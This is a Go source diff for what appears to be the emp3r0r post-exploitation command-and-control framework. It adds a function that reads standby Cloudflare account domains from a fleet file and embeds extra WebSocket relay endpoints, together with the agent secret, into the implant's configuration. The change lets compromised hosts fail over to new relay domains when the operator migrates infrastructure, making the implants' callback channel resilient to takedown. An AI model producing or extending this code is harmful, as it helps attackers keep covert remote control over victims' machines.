@@ -6,6 +6,7 @@ import (
 	"crypto/sha256"
 	"crypto/x509"
 	"encoding/base64"
+	"encoding/json"
 	"encoding/pem"
 	"fmt"
 	"net/url"
@@ -153,6 +154,11 @@ func main() {
 			fmt.Println("--relay set but emp3r0r.json has no relay_urls; add them first")
 			os.Exit(1)
 		}
+		// Hot-migration failover targets: append every standby account's relay
+		// domain (from cf_accounts.json) so a fleet moved to another CF account
+		// stays reachable by the same agent build via the existing endpoint
+		// rotation. Duplicates are dropped; the active relay stays first.
+		agentURLs = appendStandbyRelayEndpoints(agentURLs, relayRoom)
 		live.RuntimeConfig.RelayURLs = agentURLs
 		live.RuntimeConfig.C2ChannelMode = "worker_ws"
 		live.RuntimeConfig.CCAddress = agentURLs[0]
@@ -204,4 +210,66 @@ func maskSecret(url string) string {
 		}
 	}
 	return url
+}
+
+
+// appendStandbyRelayEndpoints appends wss endpoints for every standby CF
+// account listed in cf_accounts.json (hot-migration fleet file). The agent's
+// existing relay failover then covers a whole-fleet migration: dial the old
+// domain, fail (route dropped / 409), rotate to the next embedded endpoint.
+func appendStandbyRelayEndpoints(urls []string, relayRoom string) []string {
+	secret := ""
+	if len(urls) > 0 {
+		if u, err := url.Parse(urls[0]); err == nil {
+			secret = u.Query().Get("secret")
+		}
+	}
+	if relayRoom == "" || relayRoom == "same" {
+		if len(urls) > 0 {
+			if u, err := url.Parse(urls[0]); err == nil {
+				parts := strings.Split(strings.Trim(u.Path, "/"), "/")
+				if len(parts) >= 2 {
+					relayRoom = parts[1]
+				}
+			}
+		}
+	}
+	if relayRoom == "" || secret == "" {
+		return urls
+	}
+
+	type fleetFile struct {
+		Accounts []struct {
+			Domain string `json:"domain"`
+		} `json:"accounts"`
+	}
+	fleetPath := filepath.Join(live.EmpWorkSpace, "cf_accounts.json")
+	data, err := os.ReadFile(fleetPath)
+	if err != nil {
+		return urls
+	}
+	var fleet fleetFile
+	if err := json.Unmarshal(data, &fleet); err != nil {
+		return urls
+	}
+
+	seen := map[string]bool{}
+	for _, u := range urls {
+		if p, err := url.Parse(u); err == nil {
+			seen[p.Host] = true
+		}
+	}
+	for _, a := range fleet.Accounts {
+		if a.Domain == "" {
+			continue
+		}
+		host := "relay." + a.Domain
+		if seen[host] {
+			continue
+		}
+		seen[host] = true
+		u := "wss://" + host + "/ws/" + relayRoom + "?role=agent&secret=" + url.QueryEscape(secret)
+		urls = append(urls, u)
+	}
+	return urls
 }
